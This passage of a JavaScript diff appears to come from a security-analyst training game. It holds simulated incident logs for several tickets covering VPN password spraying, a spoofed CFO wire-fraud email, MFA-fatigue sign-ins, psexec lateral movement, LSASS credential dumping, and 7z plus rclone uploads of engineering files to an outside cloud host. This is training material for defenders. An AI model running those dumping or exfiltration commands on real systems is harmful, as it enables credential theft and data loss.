+[
+"2026-08-19 00:20:23",
+"t.becker",
+"38.162.106.65",
+"RO",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:25:48",
+"g.palmer",
+"94.105.17.168",
+"NL",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:26:03",
+"b.kim",
+"78.101.116.231",
+"US",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:32:33",
+"j.owens",
+"197.207.26.169",
+"IN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:32:57",
+"t.becker",
+"171.57.116.234",
+"US",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:40:34",
+"c.wu",
+"198.42.102.180",
+"VN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:40:50",
+"j.owens",
+"189.104.158.218",
+"BR",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:46:05",
+"b.kim",
+"136.116.158.194",
+"RU",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:47:04",
+"administrator",
+"117.93.70.87",
+"CN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:50:06",
+"j.owens",
+"70.39.134.250",
+"DE",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:59:04",
+"n.brooks",
+"162.222.46.116",
+"CN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:13:02",
+"n.brooks",
+"118.37.12.54",
+"VN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:14:50",
+"administrator",
+"31.3.138.79",
+"IN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:18:10",
+"svc-backup",
+"74.237.18.29",
+"RO",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:19:16",
+"test",
+"97.104.168.63",
+"VN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:20:41",
+"j.owens",
+"152.135.61.142",
+"BR",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:23:04",
+"p.nguyen",
+"130.223.151.21",
+"US",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:26:26",
+"a.singh",
+"124.165.51.102",
+"RO",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:29:49",
+"g.palmer",
+"64.4.14.143",
+"RU",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:31:03",
+"svc-scan",
+"63.44.121.108",
+"US",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:47:16",
+"h.patel",
+"143.64.48.64",
+"BR",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:49:49",
+"scanner",
+"32.28.164.154",
+"CN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:49:52",
+"h.patel",
+"90.120.57.69",
+"VN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:54:52",
+"a.singh",
+"63.9.109.183",
+"IN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:55:20",
+"s.morales",
+"123.201.201.154",
+"DE",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 01:58:44",
+"svc-backup",
+"91.219.236.18",
+"NL",
+"Auth success — password only (account not in VPN-MFA-Users)",
+"10.99.0.23"
+],
+[
+"2026-08-19 02:00:04",
+"p.nguyen",
+"166.219.120.250",
+"IN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:02:19",
+"scanner",
+"127.215.96.254",
+"US",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:02:44",
+"m.hall",
+"138.93.175.103",
+"BR",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:03:12",
+"j.owens",
+"185.220.101.33",
+"DE",
+"Auth success — password only (account not in VPN-MFA-Users)",
+"10.99.0.27"
+],
+[
+"2026-08-19 02:05:03",
+"t.becker",
+"81.96.139.237",
+"IN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:05:16",
+"j.owens",
+"201.109.237.96",
+"BR",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:05:35",
+"b.kim",
+"31.201.33.61",
+"CN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:05:36",
+"administrator",
+"125.189.130.45",
+"RU",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:07:30",
+"j.owens",
+"185.220.101.33",
+"DE",
+"Session ended (4 min)",
+"—"
+],
+[
+"2026-08-19 02:10:06",
+"a.singh",
+"51.72.21.91",
+"RO",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:11:36",
+"h.patel",
+"41.103.241.134",
+"RU",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:17:36",
+"n.brooks",
+"63.176.129.137",
+"BR",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:18:42",
+"l.osei",
+"137.245.14.81",
+"CN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:20:03",
+"administrator",
+"193.100.23.233",
+"CN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:24:26",
+"svc-backup",
+"84.97.70.88",
+"NL",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:27:08",
+"svc-scan",
+"80.63.24.46",
+"US",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:35:30",
+"c.wu",
+"135.26.204.103",
+"UA",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:35:34",
+"m.hall",
+"72.251.110.228",
+"DE",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:35:42",
+"p.nguyen",
+"61.43.165.43",
+"DE",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:43:23",
+"g.palmer",
+"189.80.20.54",
+"NL",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:48:17",
+"b.kim",
+"102.27.14.215",
+"VN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:48:51",
+"h.patel",
+"108.33.215.243",
+"NL",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:50:16",
+"r.castillo",
+"157.34.238.129",
+"RU",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 02:56:01",
+"test",
+"133.234.225.242",
+"UA",
+"Auth failed — bad password",
+"—"
+]
+]
+},
+{
+"name": "Activity After Login (firewall)",
+"type": "table",
+"guide": "Internal connections made from the two VPN IPs after the successful logins.",
+"cols": [
+"Time",
+"Source VPN IP",
+"User",
+"Destination",
+"Port / Service",
+"Action"
+],
+"rows": [
+[
+"2026-08-19 02:03:40",
+"10.99.0.27",
+"j.owens",
+"outlook.office365.com",
+"443",
+"Allow"
+],
+[
+"2026-08-19 02:05:02",
+"10.99.0.27",
+"j.owens",
+"cedarcreek.sharepoint.com",
+"443",
+"Allow"
+],
+[
+"2026-08-19 01:59:10",
+"10.99.0.23",
+"svc-backup",
+"DC01 10.10.1.10",
+"389 LDAP (directory queries)",
+"Allow"
+],
+[
+"2026-08-19 02:11:48",
+"10.99.0.23",
+"svc-backup",
+"10.20.14.0/24, 10.20.30.0/24",
+"445 SMB scan (212 hosts)",
+"Allow"
+],
+[
+"2026-08-19 03:05:16",
+"10.99.0.23",
+"svc-backup",
+"FINANCE-03 10.20.14.23",
+"445 SMB + 135 RPC",
+"Allow"
+],
+[
+"2026-08-19 03:14:01",
+"10.99.0.23",
+"svc-backup",
+"BACKUP-01 10.10.1.30",
+"443 backup console",
+"Allow"
+]
+]
+},
+{
+"name": "Account Details",
+"type": "table",
+"guide": "Facts about the two compromised accounts.",
+"cols": [
+"Account",
+"Type",
+"Groups",
+"Password last set",
+"MFA",
+"Normal VPN use"
+],
+"rows": [
+[
+"svc-backup",
+"Service account",
+"Backup Operators, Server Admins, VPN-Users",
+"2021-03-02 (never expires)",
+"Exempt (service account)",
+"Never"
+],
+[
+"j.owens",
+"User (HR)",
+"HR, VPN-Users",
+"2026-01-09",
+"Not yet migrated to VPN-MFA-Users",
+"Weekdays from home IP in O'Fallon, MO"
+]
+]
+}
+],
+"TCK-3003": [
+{
+"name": "Suspicious Email — Full Headers",
+"type": "text",
+"guide": "Compare From, Reply-To and Return-Path. Note which server actually sent the message and the DMARC result: \"fail\" with policy p=NONE means the receiving server noticed the spoof but was told to deliver it anyway.",
+"text": "Return-Path: <bounce@cedarcreek-lnd.com>\nReceived: from mail.cedarcreek-lnd.com (mail.cedarcreek-lnd.com [193.29.56.140])\n        by mx1.cedarcreek-ind.com with ESMTPS id 7Pq2Lm9aBc\n        for <amanda.singh@cedarcreek-ind.com>; Tue, 19 Aug 2026 09:11:47 -0500\nAuthentication-Results: mx1.cedarcreek-ind.com;\n        spf=pass (sender IP is 193.29.56.140) smtp.mailfrom=cedarcreek-lnd.com;\n        dkim=none (message not signed);\n        dmarc=fail (p=NONE sp=NONE) header.from=cedarcreek-ind.com\nFrom: \"Greg Palmer\" <g.palmer@cedarcreek-ind.com>\nReply-To: \"Greg Palmer\" <g.palmer@cedarcreek-lnd.com>\nTo: amanda.singh@cedarcreek-ind.com\nSubject: Confidential - Project Northwind vendor payment\nDate: Tue, 19 Aug 2026 14:11:40 +0000\nX-Originating-IP: [193.29.56.140]\n\nAmanda,\nI need you to process a wire today for the Project Northwind tooling deposit.\n$48,750.00 to Northwind Fabrication LLC\nBank: First Coastal Bank   Routing: 0xx-xxx-118   Account: xxxxxx4410\nThis is confidential until the board announcement. I'm in back-to-back\nmeetings so don't call - just reply here once it's sent.\nGreg"
+},
+{
+"name": "CFO Sign-in Log — g.palmer (last 7 days)",
+"type": "table",
+"guide": "Is the REAL CFO mailbox compromised? Look for sign-ins from unusual locations, and for repeated MFA prompts followed by an approval (MFA fatigue: the attacker keeps pushing until the user taps Approve).",
+"cols": [
+"Time",
+"Client IP",
+"Location",
+"App",
+"Result"
+],
+"rows": [
+[
+"2026-08-12 08:22:07",
+"198.51.100.24",
+"St. Louis, MO (HQ)",
+"Windows Sign-in",
+"Success — MFA approved"
+],
+[
+"2026-08-12 18:46:52",
+"174.62.10.88",
+"Chesterfield, MO (home)",
+"Outlook Mobile (iOS)",
+"Success (token)"
+],
+[
+"2026-08-12 21:58:03",
+"102.89.34.7",
+"Lagos, NG",
+"Outlook Web",
+"Password OK — MFA push denied"
+],
+[
+"2026-08-12 22:01:40",
+"102.89.34.7",
+"Lagos, NG",
+"Outlook Web",
+"Password OK — MFA push denied"
+],
+[
+"2026-08-12 22:05:12",
+"102.89.34.7",
+"Lagos, NG",
+"Outlook Web",
+"Password OK — MFA push timed out"
+],
+[
+"2026-08-12 22:09:55",
+"102.89.34.7",
+"Lagos, NG",
+"Outlook Web",
+"Password OK — MFA push denied"
+],
+[
+"2026-08-12 22:14:21",
+"102.89.34.7",
+"Lagos, NG",
+"Outlook Web",
+"Success — MFA push APPROVED"
+],
+[
+"2026-08-13 07:02:56",
+"198.51.100.24",
+"St. Louis, MO (HQ)",
+"Teams",
+"Success — MFA approved"
+],
+[
+"2026-08-13 20:02:42",
+"174.62.10.88",
+"Chesterfield, MO (home)",
+"Outlook Mobile (iOS)",
+"Success (token)"
+],
+[
+"2026-08-14 08:07:24",
+"198.51.100.24",
+"St. Louis, MO (HQ)",
+"Teams",
+"Success — MFA approved"
+],
+[
+"2026-08-14 19:35:54",
+"174.62.10.88",
+"Chesterfield, MO (home)",
+"Outlook Mobile (iOS)",
+"Success (token)"
+],
+[
+"2026-08-18 08:41:26",
+"198.51.100.24",
+"St. Louis, MO (HQ)",
+"Outlook",
+"Success — MFA approved"
+],
+[
+"2026-08-18 20:15:27",
+"174.62.10.88",
+"Chesterfield, MO (home)",
+"Outlook Mobile (iOS)",
+"Success (token)"
+],
+[
+"2026-08-19 08:42:23",
+"198.51.100.24",
+"St. Louis, MO (HQ)",
+"Outlook",
+"Success — MFA approved"
+],
+[
+"2026-08-19 20:28:11",
+"174.62.10.88",
+"Chesterfield, MO (home)",
+"Outlook Mobile (iOS)",
+"Success (token)"
+]
+]
+},
+{
+"name": "CFO Mailbox Audit Log",
+"type": "table",
+"guide": "What was done inside g.palmer's mailbox, and from where. Compare IPs to the sign-in log.",
+"cols": [
+"Time",
+"Client IP",
+"Operation",
+"Detail"
+],
+"rows": [
+[
+"2026-08-12 22:16:02",
+"102.89.34.7",
+"SearchQuery",
+"Mailbox search: \"wire\""
+],
+[
+"2026-08-12 22:17:30",
+"102.89.34.7",
+"SearchQuery",
+"Mailbox search: \"Project Northwind\""
+],
+[
+"2026-08-12 22:18:44",
+"102.89.34.7",
+"MailItemsAccessed",
+"37 messages read (board, vendor, Northwind threads)"
+],
+[
+"2026-08-12 22:20:09",
+"102.89.34.7",
+"New-InboxRule",
+"Rule \"Archive\": from *@cedarcreek-lnd.com OR subject contains \"wire\" → move to Archive, mark read"
+],
+[
+"2026-08-12 22:24:51",
+"102.89.34.7",
+"Logout",
+"—"
+],
+[
+"2026-08-19 09:24:30",
+"198.51.100.24",
+"MailItemsAccessed",
+"Normal client access (Outlook desktop)"
+]
+]
+},
+{
+"name": "Payments & Domain Lookup",
+"type": "kv",
+"guide": "Accounts Payable records and a WHOIS lookup on the Reply-To domain.",
+"rows": [
+[
+"Wire status",
+"NOT sent (AP holding)"
+],
+[
+"Vendor \"Northwind Fabrication LLC\"",
+"Not in vendor master; no prior payments"
+],
+[
+"Account xxxxxx4410",
+"Never paid by Cedar Creek before"
+],
+[
+"Real Project Northwind vendor",
+"Halvorsen Industrial (paid by ACH, account on file since 2023)"
+],
+[
+"cedarcreek-lnd.com registered",
+"2026-08-13 (one day after the CFO sign-in from Lagos)"
+],
+[
+"Our domain DMARC policy",
+"p=none (monitor only — spoofed mail is still delivered)"
+]
+]
+}
+],
+"TCK-3004": [
+{
+"name": "EDR + Windows Events (03:00–04:00)",
+"type": "table",
+"guide": "Combined endpoint and Windows events. 4624 type 3 = network logon; 7045 = a new service was installed (psexec creates \"PSEXESVC\"); wmiprvse.exe → cmd.exe = command run remotely over WMI; anything touching lsass.exe = attempt to steal passwords from memory. Filter on svc-backup and on lsass.",
+"cols": [
+"Time",
+"Host",
+"Event",
+"Detail",
+"EDR Action"
+],
+"rows": [
+[
+"2026-08-19 03:02:40",
+"SHARE-01",
+"Process",
+"MsMpEng.exe scheduled scan",
+"Observed"
+],
+[
+"2026-08-19 03:05:10",
+"FINANCE-03",
+"4624 Logon type 3",
+"svc-backup from 10.99.0.23",
+"Observed"
+],
+[
+"2026-08-19 03:05:15",
+"FINANCE-03",
+"7045 Service installed",
+"PSEXESVC (psexec remote execution)",
+"Observed"
+],
+[
+"2026-08-19 03:08:10",
+"FINANCE-07",
+"4624 Logon type 3",
+"svc-backup from 10.99.0.23",
+"Observed"
+],
+[
+"2026-08-19 03:08:15",
+"FINANCE-07",
+"7045 Service installed",
+"PSEXESVC (psexec remote execution)",
+"Observed"
+],
+[
+"2026-08-19 03:09:02",
+"FINANCE-07",
+"Process",
+"rundll32.exe comsvcs.dll, MiniDump <lsass PID> C:\\ProgramData\\odsync\\l.dmp (credential dumping)",
+"Alert only (host in Detect mode)"
+],
+[
+"2026-08-19 03:11:10",
+"ACCT-05",
+"4624 Logon type 3",
+"svc-backup from 10.99.0.23",
+"Observed"
+],
+[
+"2026-08-19 03:11:15",
+"ACCT-05",
+"7045 Service installed",
+"PSEXESVC (psexec remote execution)",
+"Observed"
+],
+[
+"2026-08-19 03:12:10",
+"BACKUP-01",
+"4624 Logon type 3",
+"svc-backup from 10.99.0.23",
+"Observed"
+],
+[
+"2026-08-19 03:12:15",
+"BACKUP-01",
+"7045 Service installed",
+"PSEXESVC (psexec remote execution)",
+"Observed"
+],
+[
+"2026-08-19 03:12:40",
+"BACKUP-01",
+"Process",
+"procdump64.exe -ma lsass.exe (credential dumping)",
+"BLOCKED"
+],
+[
+"2026-08-19 03:13:10",
+"HR-02",
+"4624 Logon type 3",
+"svc-backup from 10.99.0.23",
+"Observed"
+],
+[
+"2026-08-19 03:13:14",
+"HR-02",
+"WMI process create",
+"wmiprvse.exe → cmd.exe /c whoami & ipconfig",
+"Observed"
+],
+[
+"2026-08-19 03:16:10",
+"SALES-11",
+"4624 Logon type 3",
+"svc-backup from 10.99.0.23",
+"Observed"
+],
+[
+"2026-08-19 03:16:15",
+"SALES-11",
+"7045 Service installed",
+"PSEXESVC (psexec remote execution)",
+"Observed"
+],
+[
+"2026-08-19 03:19:10",
+"ENG-09",
+"4624 Logon type 3",
+"svc-backup from 10.99.0.23",
+"Observed"
+],
+[
+"2026-08-19 03:19:15",
+"ENG-09",
+"7045 Service installed",
+"PSEXESVC (psexec remote execution)",
+"Observed"
+],
+[
+"2026-08-19 03:24:10",
+"ENG-14",
+"4624 Logon type 3",
+"svc-backup from 10.99.0.23",
+"Observed"
+],
+[
+"2026-08-19 03:24:14",
+"ENG-14",
+"WMI process create",
+"wmiprvse.exe → cmd.exe /c whoami & ipconfig",
+"Observed"
+],
+[
+"2026-08-19 03:25:06",
+"ACCT-05",
+"Process",
+"MsMpEng.exe scheduled scan",
+"Observed"
+],
+[
+"2026-08-19 03:27:10",
+"SHARE-01",
+"4624 Logon type 3",
+"svc-backup from 10.99.0.23",
+"Observed"
+],
+[
+"2026-08-19 03:27:14",
+"SHARE-01",
+"WMI process create",
+"wmiprvse.exe → cmd.exe /c whoami & ipconfig",
+"Observed"
+],
+[
+"2026-08-19 03:27:23",
+"ACCT-05",
+"Process",
+"MsMpEng.exe scheduled scan",
+"Observed"
+],
+[
+"2026-08-19 03:31:20",
+"ENG-14",
+"WMI process create",
+"7z.exe a -p**** -v500m C:\\ProgramData\\tmp\\eng.7z \\\\fileserver\\Engineering\\Projects",
+"Observed"
+],
+[
+"2026-08-19 03:36:55",
+"SHARE-01",
+"Process",
+"net group \"Domain Admins\" /domain",
+"Observed"
+],
+[
+"2026-08-19 03:39:31",
+"FINANCE-03",
+"Process",
+"svchost.exe Windows Update check",
+"Observed"
+],
+[
+"2026-08-19 03:48:32",
+"FINANCE-07",
+"Process",
+"svchost.exe Windows Update check",
+"Observed"
+],
+[
+"2026-08-19 03:48:39",
+"HR-02",
+"Process",
+"svchost.exe Windows Update check",
+"Observed"
+],
+[
+"2026-08-19 03:49:46",
+"FINANCE-07",
+"Process",
+"OneDrive.exe sync",
+"Observed"
+],
+[
+"2026-08-19 03:54:04",
+"ACCT-05",
+"Process",
+"OneDrive.exe sync",
+"Observed"
+]
+]
+},
+{
+"name": "Logged-on Accounts (at time of credential dumping)",
+"type": "table",
+"guide": "Accounts with sessions on the two hosts targeted for credential dumping. Any password in memory on a host where dumping SUCCEEDED should be treated as stolen.",
+"cols": [
+"Host",
+"Account",
+"Session",
+"Privilege"
+],
+"rows": [
+[
+"FINANCE-07",
+"dana.reyes",
+"Cached from 08-18 (logged off 17:20)",
+"Standard user"
+],
+[
+"FINANCE-07",
+"adm.jharper",
+"Disconnected RDP session since 08-18 16:40 (never logged off)",
+"Domain Admins"
+],
+[
+"FINANCE-07",
+"svc-backup",
+"Network logon 03:08",
+"Backup Operators, Server Admins"
+],
+[
+"BACKUP-01",
+"svc-backup",
+"Network logon 03:12",
+"Backup Operators, Server Admins"
+],
+[
+"BACKUP-01",
+"adm.backup",
+"Service (Veeam)",
+"Local admin"
+]
+]
+}
+],
+"TCK-3005": [
+{
+"name": "Web Proxy Log (03:00–05:00)",
+"type": "table",
+"guide": "Outbound web traffic. The User column is the account the proxy authenticated — not necessarily the person who normally uses that computer. The User-Agent shows which program made the request.",
+"cols": [
+"Time",
+"Source",
+"Proxy User",
+"Destination",
+"Request",
+"Size",
+"User-Agent",
+"Action"
+],
+"rows": [
+[
+"2026-08-19 03:16:34",
+"ENG-14 10.20.30.14",
+"SYSTEM",
+"ctldl.windowsupdate.com",
+"GET",
+"756 KB",
+"Microsoft-CryptoAPI/10.0",
+"Allowed (Software Updates)"
+],
+[
+"2026-08-19 03:20:23",
+"ENG-09 10.20.30.9",
+"SYSTEM",
+"update.microsoft.com",
+"GET",
+"187 KB",
+"Microsoft-CryptoAPI/10.0",
+"Allowed (Software Updates)"
+],
+[
+"2026-08-19 03:40:54",
+"SALES-11 10.20.16.31",
+"SYSTEM",
+"ctldl.windowsupdate.com",
+"GET",
+"569 KB",
+"Microsoft-CryptoAPI/10.0",
+"Allowed (Software Updates)"
+],
+[
+"2026-08-19 03:50:46",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.001",
+"492 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 03:51:52",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.002",
+"473 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 03:52:12",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.003",
+"474 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 03:53:56",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.004",
+"485 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 03:55:18",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.005",
+"500 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 03:56:51",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.006",
+"499 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 03:57:50",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.007",
+"475 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 03:59:43",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.008",
+"495 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 04:00:46",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.009",
+"499 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 04:01:14",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.010",
+"472 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 04:03:53",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.011",
+"481 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 04:04:39",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.012",
+"494 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 04:05:16",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.013",
+"475 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 04:06:20",
+"ENG-14 10.20.30.14",
+"CEDARCREEK\\svc-backup",
+"gw.api.megasync-cloud.nz",
+"POST /upload eng.7z.014",
+"498 MB",
+"rclone/v1.66.0",
+"Allowed (Cloud Storage)"
+],
+[
+"2026-08-19 04:10:40",
+"SALES-11 10.20.16.31",
+"SYSTEM",
+"settings-win.data.microsoft.com",
+"GET",
+"336 KB",
+"Microsoft-CryptoAPI/10.0",
+"Allowed (Software Updates)"
+],
+[
+"2026-08-19 04:10:50",
+"SALES-11 10.20.16.31",
+"SYSTEM",
+"update.microsoft.com",
+"GET",
+"787 KB",
+"Microsoft-CryptoAPI/10.0",
+"Allowed (Software Updates)"
+],
+[
+"2026-08-19 04:13:37",
+"SALES-11 10.20.16.31",
+"SYSTEM",
+"settings-win.data.microsoft.com",
+"GET",
+"519 KB",
+"Microsoft-CryptoAPI/10.0",
+"Allowed (Software Updates)"
+],
+[
+"2026-08-19 04:16:24",
+"SALES-11 10.20.16.31",
+"SYSTEM",
+"settings-win.data.microsoft.com",
+"GET",
+"150 KB",
+"Microsoft-CryptoAPI/10.0",
+"Allowed (Software Updates)"
+],
+[
+"2026-08-19 04:57:52",
+"SALES-11 10.20.16.31",
+"SYSTEM",
+"update.microsoft.com",
+"GET",
+"261 KB",
+"Microsoft-CryptoAPI/10.0",
+"Allowed (Software Updates)"
+]
+]
+},
+{
+"name": "EDR + Logon Sessions — ENG-14",
+"type": "table",
+"guide": "Who was logged on to ENG-14 and which processes created and uploaded the archives.",
+"cols": [
+"Time",
+"Event",
+"Account",
+"Detail"
+],
+"rows": [
+[
+"2026-08-18 17:42:10",
+"Logoff",
+"t.becker",
+"Interactive session ended (no further interactive logons overnight)"
+],
+[
+"2026-08-19 03:27:10",
+"4624 Logon type 3",
+"svc-backup",
+"From 10.99.0.23 (attacker VPN session, see TCK-3002)"
+],
+[
+"2026-08-19 03:31:20",
+"WMI process create",
+"svc-backup",
+"7z.exe a -p**** -v500m C:\\ProgramData\\tmp\\eng.7z \\\\fileserver\\Engineering\\Projects"
+],
+[
+"2026-08-19 03:48:51",
+"File write",
+"svc-backup",
+"C:\\ProgramData\\tmp\\rclone.exe"
+],
+[
+"2026-08-19 03:49:30",
+"Process start",
+"svc-backup",
+"rclone.exe copy C:\\ProgramData\\tmp remote:bk --transfers 4"
+],
+[
+"2026-08-19 04:08:44",
+"Process exit",
+"svc-backup",
+"rclone.exe finished (14 files)"
+]
+]
+},
+{
+"name": "Archived Content & Baseline",
+"type": "kv",
+"guide": "What went into the archives and how unusual the traffic is.",
+"rows": [
+[
+"Source folder",
+"\\\\fileserver\\Engineering\\Projects (all customers)"
+],
+[
+"Notable content",
+"Halvorsen-Pump CAD (Confidential), customer contracts, 2 spreadsheets with employee names + SSNs (Engineering certifications)"
+],
+[
+"Archive",
+"14 × ~490 MB, password protected"
+],
+[
+"ENG-14 normal overnight upload",
+"~40 MB (updates, OneDrive)"
+],
+[
+"Destination reputation",
+"Cloud file-sharing service; not approved for company use"
+],
+[
+"Earlier USB copy (TCK-2005)",
+"Different data set (Halvorsen only), different account (t.becker), 15:11 the day before"
+]
+]
+}
+]
+};
+
+// ── Ticket evidence logs (simulated Cedar Creek logs, one tab per source) ──
+function tkLogEsc(s) { return String(s == null ? '' : s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function tkLogsHtml(ticketId) {
+  const srcs = TICKET_LOGS[ticketId] || [];
+  if (!srcs.length) return '';
+  const tabs = srcs.map((s, i) =>
+    `<button class="tk-log-tab" onclick="tkShowLog('${ticketId}',${i})" style="background:#0a1a0a;border:1px solid #1a4a2a;color:#88aa99;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:.8rem;font-weight:700;font-family:'Rajdhani',sans-serif;">${tkLogEsc(s.name)}</button>`).join('');
+  return `<div style="font-size:.78rem;font-weight:700;color:#88aa99;letter-spacing:1px;text-transform:uppercase;margin-bottom:6px;">&#128269; Evidence / Logs</div>
+    <div style="font-size:.8rem;color:#88aa99;margin-bottom:10px;">Investigate before you act. Open each log source, read the guide, and use the filter to search. Put what you find (times, hosts, IPs, accounts) in your work notes.</div>
+    <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:8px;">${tabs}</div>
+    <div id="tk-log-panel" style="background:#071a0a;border:1px solid #1a4a2a;border-radius:8px;padding:12px;margin-bottom:20px;"></div>`;
+}
+function tkShowLog(ticketId, idx) {
+  const s = (TICKET_LOGS[ticketId] || [])[idx];
+  const panel = document.getElementById('tk-log-panel');
+  if (!s || !panel) return;
+  document.querySelectorAll('.tk-log-tab').forEach((b, i) => {
+    b.style.background = i === idx ? '#003322' : '#0a1a0a';
+    b.style.color = i === idx ? '#00e676' : '#88aa99';
+    b.style.borderColor = i === idx ? '#00664a' : '#1a4a2a';
+  });
+  const mono = "font-family:'Share Tech Mono',Consolas,monospace;font-size:12px;";
+  let body = '';
+  if (s.type === 'text') {
+    body = `<pre style="${mono}color:#c0e8c8;background:#030d05;border:1px solid #143a20;border-radius:6px;padding:12px;margin:0;white-space:pre;overflow:auto;max-height:440px;">${tkLogEsc(s.text)}</pre>`;
+  } else {
+    const cols = s.type === 'kv' ? ['Field', 'Value'] : s.cols;
+    const th = cols.map(c => `<th style="position:sticky;top:0;background:#0d2a16;color:#00e676;text-align:left;padding:6px 10px;white-space:nowrap;border-bottom:1px solid #1a4a2a;">${tkLogEsc(c)}</th>`).join('');
+    const rows = s.rows.map(r => '<tr class="tk-log-row" style="border-bottom:1px solid rgba(26,74,42,.5);">'
